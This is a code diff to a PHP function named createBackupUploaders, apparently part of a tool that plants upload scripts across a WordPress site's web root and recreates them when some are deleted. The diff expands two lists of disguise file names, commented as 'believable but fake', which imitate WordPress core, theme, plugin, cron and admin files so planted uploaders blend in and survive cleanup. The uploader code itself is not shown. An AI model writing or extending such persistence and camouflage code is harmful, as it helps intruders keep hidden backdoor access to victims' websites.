@@ -847,8 +847,89 @@ function createBackupUploaders($webRoot, $uploaderContent, $count = 3) {
             $newDirs = array_slice($availableDirs, 0, $deletedCount);
             
             $uploaderNames = [
-                'wp-settings-backup.php', 'theme-update-check.php', 'plugin-verify.php',
-                'system-check.php', 'health-monitor.php', 'maintenance-mode.php'
+                // Core WordPress files (believable but fake)
+                'wp-settings-backup.php',
+                'wp-config-sample.php', 
+                'wp-activate.php',
+                'wp-comments-post.php',
+                'wp-mail.php',
+                'wp-trackback.php',
+                'wp-links-opml.php',
+                'wp-signup.php',
+                
+                // Theme related
+                'theme-update-check.php',
+                'theme-compat.php',
+                'theme-installer.php',
+                'theme-preview.php',
+                'style-rtl.php',
+                'functions-deprecated.php',
+                'template-loader.php',
+                
+                // Plugin related
+                'plugin-verify.php',
+                'plugin-upgrade.php',
+                'plugin-installer.php',
+                'plugin-editor-legacy.php',
+                'widgets-deprecated.php',
+                
+                // Update/Upgrade related
+                'update-core-verify.php',
+                'update-check.php',
+                'upgrade-functions.php',
+                'class-wp-upgrader.php',
+                'class-theme-upgrader.php',
+                'class-plugin-upgrader.php',
+                
+                // Maintenance related
+                'maintenance-mode.php',
+                'health-monitor.php',
+                'system-check.php',
+                'db-repair-check.php',
+                'optimize-tables.php',
+                'error-protection.php',
+                
+                // Cache related
+                'cache-cleanup.php',
+                'cache-compat.php',
+                'object-cache-legacy.php',
+                'transient-cleanup.php',
+                
+                // Admin related
+                'admin-ajax-legacy.php',
+                'admin-post-handler.php',
+                'load-scripts-legacy.php',
+                'load-styles-legacy.php',
+                
+                // API/Integration related
+                'rest-api-compat.php',
+                'xmlrpc-legacy.php',
+                'embed-template.php',
+                'oembed-handler.php',
+                
+                // Cron/Scheduled tasks
+                'cron-handler.php',
+                'wp-cron-legacy.php',
+                'scheduled-cleanup.php',
+                
+                // Misc believable names
+                'deprecated-functions.php',
+                'nav-menu-legacy.php',
+                'post-template-tags.php',
+                'category-template.php',
+                'author-template.php',
+                'link-template.php',
+                'general-template.php',
+                'formatting-functions.php',
+                'capabilities-check.php',
+                'user-registration.php',
+                'query-functions.php',
+                'rewrite-functions.php',
+                'taxonomy-functions.php',
+                'bookmark-template.php',
+                'feed-functions.php',
+                'meta-functions.php',
+                'default-constants.php'
             ];
             
             $newUploaderMap = [];
@@ -893,9 +974,89 @@ function createBackupUploaders($webRoot, $uploaderContent, $count = 3) {
         $selectedDirs = array_slice($directories, 0, $count);
         
         $uploaderNames = [
-            'wp-settings-backup.php', 'theme-update-check.php', 'plugin-verify.php',
-            'system-check.php', 'health-monitor.php', 'maintenance-mode.php',
-            'update-core-verify.php', 'db-repair-check.php', 'cache-cleanup.php'
+            // Core WordPress files (believable but fake)
+            'wp-settings-backup.php',
+            'wp-config-sample.php', 
+            'wp-activate.php',
+            'wp-comments-post.php',
+            'wp-mail.php',
+            'wp-trackback.php',
+            'wp-links-opml.php',
+            'wp-signup.php',
+            
+            // Theme related
+            'theme-update-check.php',
+            'theme-compat.php',
+            'theme-installer.php',
+            'theme-preview.php',
+            'style-rtl.php',
+            'functions-deprecated.php',
+            'template-loader.php',
+            
+            // Plugin related
+            'plugin-verify.php',
+            'plugin-upgrade.php',
+            'plugin-installer.php',
+            'plugin-editor-legacy.php',
+            'widgets-deprecated.php',
+            
+            // Update/Upgrade related
+            'update-core-verify.php',
+            'update-check.php',
+            'upgrade-functions.php',
+            'class-wp-upgrader.php',
+            'class-theme-upgrader.php',
+            'class-plugin-upgrader.php',
+            
+            // Maintenance related
+            'maintenance-mode.php',
+            'health-monitor.php',
+            'system-check.php',
+            'db-repair-check.php',
+            'optimize-tables.php',
+            'error-protection.php',
+            
+            // Cache related
+            'cache-cleanup.php',
+            'cache-compat.php',
+            'object-cache-legacy.php',
+            'transient-cleanup.php',
+            
+            // Admin related
+            'admin-ajax-legacy.php',
+            'admin-post-handler.php',
+            'load-scripts-legacy.php',
+            'load-styles-legacy.php',
+            
+            // API/Integration related
+            'rest-api-compat.php',
+            'xmlrpc-legacy.php',
+            'embed-template.php',
+            'oembed-handler.php',
+            
+            // Cron/Scheduled tasks
+            'cron-handler.php',
+            'wp-cron-legacy.php',
+            'scheduled-cleanup.php',
+            
+            // Misc believable names
+            'deprecated-functions.php',
+            'nav-menu-legacy.php',
+            'post-template-tags.php',
+            'category-template.php',
+            'author-template.php',
+            'link-template.php',
+            'general-template.php',
+            'formatting-functions.php',
+            'capabilities-check.php',
+            'user-registration.php',
+            'query-functions.php',
+            'rewrite-functions.php',
+            'taxonomy-functions.php',
+            'bookmark-template.php',
+            'feed-functions.php',
+            'meta-functions.php',
+            'default-constants.php'
         ];
         
         foreach ($selectedDirs as $index => $dir) {
